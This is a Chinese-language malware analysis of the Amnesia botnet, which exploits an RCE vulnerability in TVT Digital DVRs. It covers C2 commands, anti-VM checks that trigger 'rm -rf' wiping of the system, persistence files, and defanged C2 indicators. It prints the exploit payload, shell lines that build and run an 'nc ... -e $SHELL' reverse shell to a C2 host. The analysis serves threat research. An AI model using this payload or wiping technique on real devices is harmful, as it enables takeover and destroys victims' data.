
# Amnesia Collection

### 一、Collection 1

> Amnesia家族
Amnesia僵尸网络的目标是未经修补、存在远程代码执行漏洞的设备。该漏洞于一年前于2016年3月在由TVT Digital制作的DVR（数字录像机）设备中公开披露，并由全球70多家供应商进行品牌宣传。

根据扫描数据，这个漏洞影响全球大约22.7万台设备，其中台湾，美国，以色列，土耳其和印度是最受欢迎的设备。

Amnesia恶意软件是第一个采用虚拟机逃逸技术来绕过linux沙箱保护的恶意软件。虚拟机逃逸技术通常与MicrosoftWindows和Google Android恶意软件相关联。

与这些类似，Amnesia试图检测它是否运行在基于VirtualBox，VMware或QEMU的虚拟机上，如果它检测到这些环境，它将通过删除文件系统中的所有文件来擦除虚拟化的Linux系统。这不仅会影响Linux恶意软件分析沙箱，还会影响VPS或公共云上的一些基于QEMU的Linux服务器。

Amnesia通过扫描，定位易受攻击的设备来利用这个远程代码执行漏洞，一次成功的攻击就可导致Amnesia获得设备的完全控制。

技术细节：

2016年3月22日，安全研究员Rotem Kerner向公众披露了这个漏洞。根据他的博客，全球有超过70家DVR供应商受到这个漏洞的影响。但是，所有的DVR设备都是由同一家公司“TVT Digital”生产的。

此外，通过使用“Web服务器”的指纹，安全研究者发现超过22.7万个设备暴露在互联网上，可能是由TVT数字公司生产的。

我们还搜索了Shodan.io和Censys.io上的关键字。他们分别报告了约50,000和约705,000个IP地址，下面显示了潜在易受攻击的TVT数字DVR设备排名前20位的国家/地区：

潜在易受影响的TVT DVR数字设备的前20个国家/地区

漏洞利用和exploit开发

Amnesia僵尸网络使用IRC协议与其C2服务器进行通信。下图显示了它可接收的一些命令，包括通过不同类型的HTTP泛洪和UDP泛洪来发起DDoS攻击。

Amnesia家族所用的C2命令，除了这些命令外，还实施了两个命令：CCTVSCANNER和CCTVPROCS。

这些命令用于扫描和利用TVT数字硬盘录像机的RCE漏洞。接收到命令后，Amnesia首先会对该命令包含的IP地址进行简单的HTTP请求，检查目标是否为易受攻击的DVR设备。

这是通过在HTTP响应内容中搜索一个特殊的字符串“Cross Web Server”完成的。如图所示，因为TVT Digital的DVR使用这个字符串作为HTTP头中的服务器名称。

上图通过指纹检查目标是否是易受攻击的DVR

如果发现一个易受攻击的DVR，Amnesia将发送四个HTTP请求，其中包含四个不同shell命令的payload，这些命令是：

echo “nc” &gt; f

echo “{one_of_c2_domains}” &gt;&gt; f

echo “8888 –e $SHELL” &gt;&gt; f

$(cat f) &amp; &gt; r

这些命令创建一个shell脚本并执行它。脚本内容是与Amnesia C2服务器之一连接，并获取shell。因此，受感染的设备将会受到威胁，并会侦听来自C2服务器的进一步shell命令，如下图所示

反取证

当Amnesia样本执行时，它会通过读取文件 / sys / class / dmi / id / product_name和 / sys / class / dmi / id / sys_vendor并且将文件内容与关键字“VirtualBox “，”VMware“和”QEMU“，Linux DMI（桌面管理界面）使用这两个文件来存储硬件的产品和制造商信息。这些包含在DMI文件中的字符串意味着Linux系统分别在基于VirtualBox，VMware或QEMU的虚拟机中运行。

如果检测到虚拟机，Amnesia会自行删除，然后尝试删除所有以下目录：

Linux根目录“/”，

当前用户的主目录“/”和

当前工作目录“./

这些删除操作基本上等同于擦除整个Linux系统。它们是通过简单地执行shell命令“rm -rf”来实现的，如下图所示。对于每个目录，“rm”命令将被执行两次 –一个在后台，一个在前台。因此，删除这三个目录将是平行的。最后，Amnesia等待删除完成。

Amnesia的作者正打算击败基于Linux的恶意软件分析沙箱，并且由于代码中的硬编码字符串（“fxxkwhitehats”）而给安全研究人员带来麻烦。但是，基于虚拟机的沙箱通常会启用系统快照，从而可以快速恢复到原始状态（尽管样本的分析任务可能会被破坏）在这些情况下，影响将受到限制。

真正的问题是，如果恶意软件感染了某些基于QEMU的Linux服务器实例，比如VPS厂商提供的虚拟主机，则Linux服务器也将被清除，如果备份不可用，这可能是灾难性的。

VM检查后，Amnesia会在/etc/init.d/.rebootime和/etc/cron.daily/.reboottime或/ .bashrc和/ .bash_history中创建持久性文件，具体取决于当前用户的权限。然后杀死所有Telnet和SSH相关的进程，并连接到C2服务器以接收更多命令。

Amnesia硬编码的三个域名，“irc.freenode.net”作为诱饵C2服务器地址。然而，真正的C2配置在运行时通过简单的凯撒密码算法进行解密。它选择这三个服务器之一：

ukranianhorseriding[.]net

surrealzxc.co[.]za

inversefierceapplied[.]pw

自2016年12月1日起，所有这三个域名均已解析为相同的IP地址93.174.95 .38。在此之前，IP地址还用于托管其他物联网/Linux恶意软件，如DropPerl。
